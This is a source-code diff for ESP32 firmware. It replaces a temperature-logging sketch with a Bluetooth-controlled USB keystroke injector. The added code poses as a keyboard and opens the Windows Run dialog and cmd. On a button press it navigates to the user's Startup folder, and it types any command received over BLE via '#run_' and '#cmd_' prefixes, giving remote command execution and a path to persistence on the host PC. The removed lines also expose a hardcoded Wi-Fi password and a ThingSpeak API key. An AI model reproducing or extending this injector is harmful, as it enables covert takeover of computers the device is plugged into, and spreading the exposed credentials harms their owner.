@@ -1,163 +1,205 @@
-//$ 11/JULY/2023 10:50 PM
-//~ Version 2.0.0
-//! # symbol not update when wifi connection re established.
+//$ 5/SEP/2023 12:35 AM
 
-#include <DHT.h>
-#include <LiquidCrystal_I2C.h>
-#include <ThingSpeak.h>
+//% TODO: cade can loop a specific command action and can take it from BLE or
+//% via wifi
+
+// # last task done:
+//` Code can execute command via CMD and run a program via BLE input
+// BLE input should sync with web portal input and web portal can execute
+// multiple commands
+
+// #.....................................................
+#include <BLEDevice.h>
+#include <BLEServer.h>
+#include <BLEUtils.h>
+
+//+ HID part ...................... :
+#include "USB.h"
+#include "USBHIDKeyboard.h"
 #include <WiFi.h>
-#include <Wire.h>
-#include <random>
+#include <esp_now.h>
+String username = "hamid";
+String output = "";
+USBHIDKeyboard Keyboard;
+const int buttonPin = 0; // GPIO0 is the default boot button pin
+int previousButtonState = LOW;
 
-#define LCD_ADDRESS 0x27
-#define LCD_COLUMNS 16
-#define LCD_ROWS 2
-LiquidCrystal_I2C lcd(LCD_ADDRESS, LCD_COLUMNS, LCD_ROWS);
+void println(String str);
 
-// Initialize the DHT11 sensor
-#define DHTPIN 16 // Change the pin if necessary
-DHT dht(DHTPIN, DHT11);
+void print(String str);
 
-// ThingSpeak parameters
-const char *ssid = "Archer 73";
-const char *password = "Archer@73_102#";
-const unsigned long channelID = 2201589;
-const char *apiKey = "M6GKK40AB3Q7YE42";
+//+ ................................
 
-unsigned long updateInterval = 2 * 60;
-unsigned long previousUpdateTime = 0;
-unsigned int last_update = 0; // in seconds
-WiFiClient client;
+BLEServer *pServer = NULL;
+BLECharacteristic *pCharacteristic = NULL;
+bool deviceConnected = false;
+bool oldDeviceConnected = false;
+std::string receivedData = "";
 
-String END_VALUES = "  ";
-String line_1 = "Temp: 00.0 C";
-String line_2 = "                ";
+class MyServerCallbacks : public BLEServerCallbacks {
+  void onConnect(BLEServer *pServer) { deviceConnected = true; }
 
-void connect_wifi();
-void lcd_print();
-const int LED = 20;
+  void onDisconnect(BLEServer *pServer) { deviceConnected = false; }
+};
+
+void BLE_inputManager(String input);
+class MyCharacteristicCallbacks : public BLECharacteristicCallbacks {
+  void onWrite(BLECharacteristic *pCharacteristic) {
+    std::string value = pCharacteristic->getValue();
+    if (value.length() > 0) {
+      receivedData = value;
+      print("Received from BLE: ");
+      Serial.println(receivedData.c_str());
+      BLE_inputManager(String(receivedData.c_str()));
+
+      // Print the received data back to the BLE connection
+      receivedData = output.c_str();
+      pCharacteristic->setValue("BLE: " + receivedData);
+      pCharacteristic->notify();
+    }
+  }
+};
+
 void setup() {
-  // Initialize the I2C interface with your desired SDA and SCL pins
-  Wire.begin(21, 19);
 
-  // Initialize the LCD display
-  lcd.begin(LCD_COLUMNS, LCD_ROWS);
-
-  // Turn on the backlight
-  lcd.setBacklight(HIGH);
   Serial.begin(115200);
-  Serial.println("\nRandom number: " + String(random(10, 31)));
-  dht.begin(); // Initialize the DHT11 sensor
-  connect_wifi();
-  pinMode(LED, OUTPUT);
-  ThingSpeak.begin(client); // Initialize ThingSpeak
-  ThingSpeak.setField(4, random(10, 31));
-  END_VALUES.setCharAt(1, '#');
+  //+.................................
+  pinMode(buttonPin, INPUT_PULLDOWN);
+  Keyboard.begin();
+  USB.begin();
+  //+.................................
+
+  BLEDevice::init("ESP32-S3 BLE");
+  pServer = BLEDevice::createServer();
+  pServer->setCallbacks(new MyServerCallbacks());
+
+  BLEService *pService = pServer->createService(
+      BLEUUID("4fafc201-1fb5-459e-8fcc-c5c9c331914b")); // Custom service UUID
+  pCharacteristic = pService->createCharacteristic(
+      BLEUUID(
+          "beb5483e-36e1-4688-b7f5-ea07361b26a8"), // Custom characteristic UUID
+      BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_WRITE);
+  pCharacteristic->setCallbacks(new MyCharacteristicCallbacks());
+
+  pService->start();
+
+  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
+  pAdvertising->addServiceUUID(pService->getUUID());
+  pAdvertising->setScanResponse(true);
+  pAdvertising->setMinPreferred(0x06); // sets the minimum advertising interval
+  BLEDevice::startAdvertising();
+
+  println("Waiting for Bluetooth connection...");
 }
 
 void loop() {
-  // take serial input like ut:20 to set update interval for 20 second
-  if (Serial.available() > 0) {
-    String input = Serial.readString();
-    if (input.startsWith("ut:")) {
-      updateInterval = input.substring(3).toInt();
-    }
-    Serial.println("New update interval is : " + String(updateInterval));
-  }
+  //+.................................
+  int buttonState = digitalRead(buttonPin);
 
-  // Read temperature and humidity from the DHT11 sensor
-  float temperature = dht.readTemperature();
-  int humidity = dht.readHumidity();
-
-  char temperatureStr[5];
-  dtostrf(temperature, 4, 1, temperatureStr);
-
-  line_1 =
-      line_1.substring(0, 6) + String(temperatureStr) + " C  " + END_VALUES;
-
-  line_2 = "Hu: " + String(humidity) + " % /" + get_time();
-  lcd_print();
-  if (((millis() / 1000) - previousUpdateTime) >= updateInterval) {
-    previousUpdateTime = (millis() / 1000);
-    updateThingSpeak(temperature, humidity);
-  }
-
-  delay(2000); // Delay between readings
-}
-
-void updateThingSpeak(float temperature, int humidity) {
-  ThingSpeak.setField(1, temperature); // Set temperature value
-  ThingSpeak.setField(2, humidity);    // Set humidity value
-
-  int updateStatus = ThingSpeak.writeFields(channelID, apiKey);
-  if (updateStatus == 200) {
-    Serial.println("ThingSpeak update successful");
-    SUCCESS_MSG();
-  } else {
-    Serial.print("Error updating ThingSpeak. Status: ");
-    Serial.println(updateStatus);
-    ERROR_MSG();
-  }
-}
-void SUCCESS_MSG() {
-  // set curser to first row, first last column and print "tick symbol"
-  digitalWrite(LED, HIGH);
-  END_VALUES.setCharAt(1, '+');
-  last_update = (millis() / 1000);
-}
-void ERROR_MSG() {
-  // set curser to first row, first last column and print "tick symbol"
-  digitalWrite(LED, LOW);
-  END_VALUES.setCharAt(1, '-');
-  connect_wifi();
-}
-void connect_wifi() {
-  WiFi.begin(ssid, password); // Connect to Wi-Fi
-  int i = 0;
-  while (!wifi_connected()) {
-    if (i > 10) {
-      Serial.println("Timeout: Unable to connect to WiFi");
-      break;
-    }
+  if (buttonState == HIGH && previousButtonState == LOW) {
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press('r');
+    Keyboard.releaseAll();
+    delay(1000);
+    Keyboard.print("cmd");
     delay(500);
-    i++;
-    END_VALUES.setCharAt(0, '?');
-    lcd_print();
+    Keyboard.press(KEY_RETURN);
+    delay(100);
+    Keyboard.release(KEY_RETURN);
+    delay(1000);
+    Keyboard.print(
+        "cd %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start "
+        "Menu\\Programs\\Startup");
     delay(500);
-    END_VALUES.setCharAt(0, ' ');
+    Keyboard.press(KEY_RETURN);
+    delay(100);
+    Keyboard.release(KEY_RETURN);
+    delay(2000);
   }
-  Serial.println("Wi-Fi connected successfully");
-  if (wifi_connected()) {
-    END_VALUES.setCharAt(0, '*');
-    lcd_print();
+  if (buttonState == LOW && previousButtonState == HIGH) {
+    Keyboard.release(97);
+    delay(50);
+  }
+  previousButtonState = buttonState;
+  //+.................................
+  if (deviceConnected) {
+    if (!oldDeviceConnected) {
+      println("Connected to device");
+      oldDeviceConnected = true;
+    }
   } else {
-    END_VALUES.setCharAt(0, '!');
-    lcd_print();
+    if (oldDeviceConnected) {
+      println("Disconnected from device");
+      pServer->startAdvertising(); // restart advertising
+      println("Restart advertising");
+      oldDeviceConnected = false;
+    }
+  }
+
+  delay(100);
+}
+
+void BLE_inputManager(String input) {
+  if (input == "test") {
+    println("defined word: test");
+  } else if (input.startsWith("#run_")) {
+    String command = input.substring(5);
+    runCommand(command);
+  } else if (input.startsWith("#cmd_")) {
+    String command = input.substring(5);
+    cmdCommand(command);
+  } else {
+    println("Sending: " + input);
+    Keyboard.print("cmd");
   }
 }
-bool wifi_connected() {
-  if (WiFi.status() == WL_CONNECTED) {
-    return true;
-  } else {
-    return false;
-  }
+
+void runCommand(String command) {
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(700);
+  Keyboard.print(command);
+  delay(300);
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.release(KEY_RETURN);
+  delay(300);
+
+  //   Keyboard.press(KEY_LEFT_ARROW);
+  //   delay(300);
+  //   Keyboard.release(KEY_LEFT_ARROW);
+  //   delay(300);
+
+  //   Keyboard.press(KEY_RETURN);
+  //   delay(100);
+  //   Keyboard.release(KEY_RETURN);
 }
-void lcd_print() {
-  lcd.clear();
-  lcd.print(line_1);
-  lcd.setCursor(0, 1);
-  lcd.print(line_2);
+
+void cmdCommand(String command) {
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(700);
+  Keyboard.print("cmd");
+  delay(300);
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.release(KEY_RETURN);
+  delay(500);
+  Keyboard.print(command);
+  delay(300);
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.release(KEY_RETURN);
 }
-String get_time() {
-  unsigned int sec = (millis() / 1000) - last_update;
-  if (sec < 60) {
-    return (String(sec) + " s");
-  } else if ((sec >= 60) && (sec < 3600)) {
-    return (String(sec / 60) + "m" + String(sec % 60) + "s");
-  } else {
-    Serial.println("Issue spotted sec value: " + String(sec));
-    connect_wifi();
-    return String(-1);
-  }
-  return "X";
+
+void println(String str) {
+  Serial.println(str);
+  output = str;
+}
+
+void print(String str) {
+  Serial.print(str);
+  output = str;
 }
